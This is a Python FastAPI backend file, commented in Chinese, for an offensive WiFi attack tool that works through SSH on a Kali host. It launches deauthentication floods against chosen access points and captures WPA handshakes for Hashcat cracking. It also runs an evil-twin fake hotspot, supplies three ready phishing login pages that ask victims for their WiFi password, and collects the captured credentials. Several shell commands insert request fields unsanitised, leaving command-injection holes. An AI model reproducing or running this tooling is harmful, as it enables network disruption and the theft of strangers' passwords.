from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from app.modules.ai_agent.service import ai_service
from app.core.ssh_manager import ssh_client
import os
import time
import json
from pathlib import Path

router = APIRouter()


# ==========================================
# 1. 请求模型定义
# ==========================================
class AttackRequest(BaseModel):
    # 基础参数
    bssid: str
    interface: str = "wlan0"  # 攻击/监听网卡
    channel: str = "1"
    duration: int = 60  # 攻击时长

    # --- Evil Twin (双子热点) 专用参数 ---
    ap_interface: str = "wlan1"
    ssid: str = "Free_WiFi"
    template_html: str = ""


class AIAnalysisRequest(BaseModel):
    ssid: str
    encryption: str
    bssid: str


# ==========================================
# 2. 辅助工具：更强壮的路径查找
# ==========================================
def find_payload_script(script_name: str):
    """
    更智能地查找 kali_payloads 脚本路径
    """
    current_file = Path(__file__).resolve()

    # 定义可能的项目根目录位置
    search_paths = [
        current_file.parents[5] / "kali_payloads" / script_name,  # 标准开发环境
        current_file.parents[4] / "kali_payloads" / script_name,
        Path.cwd() / "kali_payloads" / script_name,  # 以此处运行目录为基准
        Path.cwd().parent / "kali_payloads" / script_name,  # 上一级目录
        Path("/app/kali_payloads") / script_name,  # Docker 常见路径
    ]

    for p in search_paths:
        if p.exists():
            return str(p)

    # 如果都找不到，打印日志帮助调试
    print(f"[!] Critical Error: Cannot find {script_name} in any of: {[str(p) for p in search_paths]}")
    return None


# ==========================================
# 3. 基础功能：文件下载
# ==========================================
@router.get("/download/{filename}")
async def download_file(filename: str):
    """下载 captures 目录下的抓包文件 (.cap/.hc22000)"""
    if ".." in filename or "/" in filename:
        raise HTTPException(400, "Invalid filename")

    # 尝试在 backend/captures 或当前目录寻找
    possible_paths = [
        Path.cwd() / "captures" / filename,
        Path(__file__).resolve().parents[4] / "captures" / filename
    ]

    file_path = None
    for p in possible_paths:
        if p.exists():
            file_path = p
            break

    if not file_path:
        raise HTTPException(404, "File not found")

    return FileResponse(path=file_path, filename=filename, media_type='application/octet-stream')


# ==========================================
# 4. 核心攻击功能：Deauth
# ==========================================
@router.post("/deauth")
async def start_deauth_attack(req: AttackRequest):
    if not ssh_client.client:
        try:
            ssh_client.connect()
        except Exception as e:
            raise HTTPException(500, f"SSH 连接失败: {str(e)}")

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path:
        raise HTTPException(500, f"后端错误: 找不到本地脚本 {script_name}")

    try:
        remote_path = ssh_client.upload_payload(local_path, script_name)
        if not remote_path:
            raise HTTPException(500, "文件上传到 Kali 失败")

        duration = int(req.duration)
        # 加上 nohup 并在后台运行
        cmd = f"nohup python3 {remote_path} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {duration} > /tmp/attack_deauth.log 2>&1 &"
        ssh_client.exec_command(cmd)

        return {"status": "started", "msg": "Deauth 攻击已启动", "log": "/tmp/attack_deauth.log"}
    except Exception as e:
        raise HTTPException(500, f"执行异常: {str(e)}")


# ==========================================
# 5. 核心攻击功能：握手包捕获 (已修复超时与部署)
# ==========================================
@router.post("/handshake")
async def start_handshake_capture(req: AttackRequest):
    if not ssh_client.client: ssh_client.connect()

    script_name = "attack_worker.py"
    local_path = find_payload_script(script_name)
    if not local_path:
        raise HTTPException(500, f"无法定位 Payload: {script_name}，请检查项目目录结构")

    # 1. 部署/更新脚本到 Kali
    remote_path = ssh_client.upload_payload(local_path, script_name)
    if not remote_path:
        raise HTTPException(500, "SSH 上传脚本失败，请检查 Kali 磁盘空间或权限")

    # 2. 构造命令
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"

    try:
        # 【关键修复】
        # timeout: 设为 duration + 25秒，给 SSH 连接和脚本启动留出余量
        # get_pty=True: 强制分配伪终端，确保 stdout 能实时输出，并且 stdout.read() 不会因为缓冲而为空
        timeout_val = int(req.duration) + 25
        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=timeout_val, get_pty=True)

        # 读取完整输出
        output = stdout.read().decode()

        response_data = {"status": "failed", "msg": "未捕获到握手包", "debug": output}

        # 3. 结果处理
        # 确保本地 captures 目录存在
        local_dir = Path.cwd() / "captures"
        if not local_dir.exists(): local_dir.mkdir(parents=True, exist_ok=True)

        if "CAPTURED_HS_POTENTIAL" in output:
            remote_prefix = f"/tmp/handshake_{req.bssid.replace(':', '')}"
            ts = int(time.time())

            # A. 下载 .cap 文件
            remote_cap = f"{remote_prefix}-01.cap"
            local_cap = f"handshake_{req.bssid.replace(':', '')}_{ts}.cap"

            # 先检查远程文件是否存在
            _in, _out, _err = ssh_client.exec_command(f"ls {remote_cap}")
            if not _err.read():
                if ssh_client.download_file(remote_cap, str(local_dir / local_cap)):
                    response_data["status"] = "success"
                    response_data["msg"] = "成功捕获握手包"
                    response_data["cap_file"] = local_cap

            # B. 下载 Hashcat 文件 (如果有)
            remote_hc = f"{remote_prefix}.hc22000"
            local_hc = f"handshake_{req.bssid.replace(':', '')}_{ts}.hc22000"
            _in, _out, _err = ssh_client.exec_command(f"ls {remote_hc}")
            if not _err.read():
                if ssh_client.download_file(remote_hc, str(local_dir / local_hc)):
                    response_data["hash_file"] = local_hc

        return response_data

    except Exception as e:
        # 捕获 SSH 超时或其他错误
        print(f"[!] Handshake Error: {e}")
        return {"status": "error", "msg": f"执行出错或超时: {str(e)}"}


# ==========================================
# 6. AI 分析接口
# ==========================================
@router.post("/ai/analyze_target")
async def analyze_target(req: AIAnalysisRequest):
    try:
        raw = ai_service.analyze_wifi_target(req.ssid, req.encryption, "Unknown")
        if isinstance(raw, dict) and "risk_level" in raw: return raw
        return {"risk_level": "中", "summary": "Info", "advice": "Attempt handshake capture"}
    except:
        return {"risk_level": "Unknown"}


# ==========================================
# 7. 🔥 Evil Twin (双子攻击) 完整增强版
# ==========================================

# 7.1 获取预置模板
@router.get("/eviltwin/templates")
async def get_phishing_templates():
    """返回预置的钓鱼页面模板"""
    templates = [
        {
            "name": "通用中文认证 (Generic CN)",
            "content": """<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><meta charset="utf-8"></head><body style="background:#f5f5f5;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0"><div style="background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:85%;max-width:320px;text-align:center"><h3 style="margin-top:0">安全检测</h3><p style="font-size:14px;color:#666">为了保障您的网络安全，系统检测到异常活动。请验证 WiFi 密码以继续连接。</p><form method="POST"><input name="password" type="password" placeholder="输入 WiFi 密码" required style="width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box"><button style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer">立即验证</button></form></div></body></html>"""
        },
        {
            "name": "路由器固件升级 (Firmware Upgrade)",
            "content": """<html><head><meta charset="utf-8"></head><body style="padding:50px;text-align:center;font-family:Arial"><h2>路由器固件升级通知</h2><p>您的路由器固件版本过低，需要验证管理员密码(WiFi密码)以安装安全补丁。</p><form method="POST"><input type="password" name="password" placeholder="WiFi Password"><br><br><button>开始升级</button></form></body></html>"""
        },
        {
            "name": "星巴克风格 (Coffee Shop)",
            "content": """<html><body style="background:#006241;color:white;text-align:center;padding-top:50px"><h1>Free WiFi</h1><p>Welcome! Please login to connect.</p><form method="POST"><input type="password" name="password" placeholder="WiFi Password" style="padding:10px"><br><br><button style="padding:10px 20px">Connect</button></form></body></html>"""
        }
    ]
    return {"status": "success", "data": templates}


# 7.2 启动攻击 (双核驱动)
@router.post("/eviltwin/start")
async def start_evil_twin(req: AttackRequest):
    """
    启动双子攻击：
    1. req.interface -> 负责 Deauth 攻击 (强制 duration=0, 无限攻击)
    2. req.ap_interface -> 负责 建立 AP + 钓鱼
    """
    if req.interface == req.ap_interface:
        raise HTTPException(400, "错误：攻击网卡和 AP 网卡不能是同一个！请插入两张网卡。")

    if not ssh_client.client:
        ssh_client.connect()

    # 1. 上传 Evil Twin 脚本
    et_script = "eviltwin_worker.py"
    local_et = find_payload_script(et_script)
    if not local_et: raise HTTPException(500, f"找不到 {et_script}")
    remote_et = ssh_client.upload_payload(local_et, et_script)

    # 2. 上传 Deauth 脚本
    deauth_script = "attack_worker.py"
    local_deauth = find_payload_script(deauth_script)
    if not local_deauth: raise HTTPException(500, f"找不到 {deauth_script}")
    remote_deauth = ssh_client.upload_payload(local_deauth, deauth_script)

    try:
        # 处理 HTML 模板 (简单转义，防止命令注入)
        clean_html = req.template_html.replace('"', '\\"').replace('`', '\\`')

        # 3. 启动 Fake AP (后台运行，日志输出到 /tmp/eviltwin.log)
        print(f"[*] Starting Evil Twin on {req.ap_interface} with SSID: {req.ssid}")
        # 先初始化日志文件
        ssh_client.exec_command("echo '[System] Initializing Fake AP...' > /tmp/eviltwin.log")

        et_cmd = f"nohup python3 {remote_et} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --template \"{clean_html}\" >> /tmp/eviltwin.log 2>&1 &"
        ssh_client.exec_command(et_cmd)

        # 4. 启动 Deauth 攻击 (后台运行，日志输出到 /tmp/et_deauth.log)
        print(f"[*] Starting Deauth Flood on {req.interface} -> {req.bssid}")
        # 初始化日志文件
        ssh_client.exec_command("echo '[System] Initializing Deauth Attack...' > /tmp/et_deauth.log")

        # 🔥 关键修改：强制 duration=0，确保攻击是无限循环的，直到用户点击停止
        deauth_cmd = f"nohup python3 {remote_deauth} deauth --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration 0 >> /tmp/et_deauth.log 2>&1 &"
        ssh_client.exec_command(deauth_cmd)

        # 【恢复详细返回】这里恢复了你原来需要的详细信息
        return {
            "status": "started",
            "msg": "双子攻击已启动！Deauth 正在持续攻击目标，AP 已建立。",
            "details": {
                "ap_interface": req.ap_interface,
                "deauth_interface": req.interface,
                "ssid": req.ssid,
                "logs": ["/tmp/eviltwin.log", "/tmp/et_deauth.log"]
            }
        }

    except Exception as e:
        raise HTTPException(500, f"启动失败: {str(e)}")


# 7.3 停止攻击
@router.post("/eviltwin/stop")
async def stop_evil_twin():
    """停止所有攻击并恢复网络"""
    if not ssh_client.client: ssh_client.connect()
    try:
        # 杀掉 Python 脚本进程
        ssh_client.exec_command("pkill -f eviltwin_worker.py")
        ssh_client.exec_command("pkill -f attack_worker.py")

        # 杀掉底层工具进程
        ssh_client.exec_command("killall hostapd dnsmasq aireplay-ng")

        # 清理 iptables 流量转发规则
        ssh_client.exec_command("iptables --flush && iptables -t nat --flush")

        return {"status": "success", "msg": "Evil Twin 攻击已停止，环境已清理。"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}


# 7.4 获取捕获到的密码
@router.get("/eviltwin/credentials")
async def get_credentials():
    """读取 Kali 上捕获到的钓鱼密码"""
    if not ssh_client.client: ssh_client.connect()
    try:
        # 读取 /tmp/eviltwin/captured_creds.txt
        stdin, stdout, stderr = ssh_client.exec_command("cat /tmp/eviltwin/captured_creds.txt")
        data = stdout.read().decode()

        if not data:
            return {"status": "waiting", "data": []}

        creds = []
        for line in data.splitlines():
            if line.strip():
                creds.append(line.strip())

        return {"status": "success", "data": creds}
    except Exception:
        # 文件可能还不存在（还没人中招）
        return {"status": "empty", "data": []}


# 7.5 获取实时日志 (新增，用于前端监控)
@router.get("/eviltwin/logs")
async def get_eviltwin_logs():
    """
    同时获取 AP 日志和 攻击日志
    用于前端实时显示 'Sending Deauth...' 和 'Hostapd started...'
    """
    if not ssh_client.client: ssh_client.connect()
    try:
        # 使用 tail 读取两个文件的最后 10 行
        # 中间用 --- 分隔
        cmd = "tail -n 10 /tmp/eviltwin.log; echo '---'; tail -n 10 /tmp/et_deauth.log"
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        output = stdout.read().decode()

        logs = []
        for line in output.splitlines():
            clean_line = line.strip()
            if clean_line and clean_line != "---":
                logs.append(clean_line)

        return {"status": "success", "logs": logs}
    except Exception:
        return {"status": "error", "logs": []}